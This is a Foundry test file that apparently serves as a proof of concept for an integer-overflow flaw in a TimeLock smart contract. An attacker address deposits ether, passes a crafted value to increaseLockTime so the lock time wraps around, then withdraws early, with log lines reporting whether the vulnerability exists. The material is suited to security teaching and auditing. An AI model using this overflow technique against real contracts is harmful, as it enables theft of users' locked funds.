// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/timelock.sol";

contract TimeLockTest is Test {
    TimeLock timeLock;
    address owner;
    address attacker;

    function setUp() public {
        owner = address(this);
        attacker = address(0xBAD);
        
        timeLock = new TimeLock();
        
        // Fund the attacker with some ETH
        vm.deal(attacker, 1 ether);
    }

    function testLockTimeOverflow() public {
        console.log("--- BEFORE-Trigger Overflow ---");
        // Attacker deposits
        vm.prank(attacker);
        timeLock.deposit{value: 1 ether}();

        // Record initial state
        uint initialLockTime = timeLock.lockTime(attacker);
        uint attackerInitialBalance = attacker.balance;
        uint contractInitialBalance = address(timeLock).balance;
        
        console.log("Initial lock time:", initialLockTime);
        console.log("Attacker initial balance: %e", attackerInitialBalance);
        console.log("Contract initial balance: %e", contractInitialBalance);

        console.log("--- Trigger Overflow ---");
        // Calculate overflow amount
        uint maxUint = type(uint).max;
        uint overflowAmount = maxUint - initialLockTime + 1;

        // Trigger overflow
        vm.prank(attacker);
        timeLock.increaseLockTime(overflowAmount);

        console.log("--- AFTER-Trigger Overflow ---");
        // Check post-overflow state
        uint newLockTime = timeLock.lockTime(attacker);
        console.log("New lock time:", newLockTime);
        bool overflowSuccess = newLockTime < initialLockTime;
        console.log("Overflow successful:", overflowSuccess);

        // Fast forward time
        vm.warp(block.timestamp + newLockTime + 1);
        
        console.log("--- BEFORE-Trigger Withdraw ---");
        // Record pre-withdrawal balances
        uint attackerPreWithdrawBalance = attacker.balance;
        uint contractPreWithdrawBalance = address(timeLock).balance;
        console.log("Pre-withdraw attacker balance: %e", attackerPreWithdrawBalance);
        console.log("Pre-withdraw contract balance: %e", contractPreWithdrawBalance);
        
        console.log("--- Trigger Withdraw ---");
        // Execute withdrawal
        vm.prank(attacker);
        timeLock.withdraw();
        
        console.log("--- AFTER-Trigger Withdraw ---");
        // Record post-withdrawal balances
        uint attackerPostWithdrawBalance = attacker.balance;
        uint contractPostWithdrawBalance = address(timeLock).balance;
        console.log("Post-withdraw attacker balance: %e", attackerPostWithdrawBalance);
        console.log("Post-withdraw contract balance: %e", contractPostWithdrawBalance);
        
        // Check withdrawal success
        bool withdrawSuccess = (attackerPostWithdrawBalance - attackerPreWithdrawBalance == 1 ether) &&
                              (contractPreWithdrawBalance - contractPostWithdrawBalance == 1 ether);
        console.log("Withdrawal successful:", withdrawSuccess);
        
        // Final verdict
        if (overflowSuccess && withdrawSuccess) {
            console.log("Vulnerability Exists: Lock time overflowed and funds were withdrawn");
        } else {
            string memory reason = "Overflow failed";
            if (!withdrawSuccess) reason = "Withdraw failed";
            console.log("Vulnerability not Exist: %s", reason);
        }
    }
}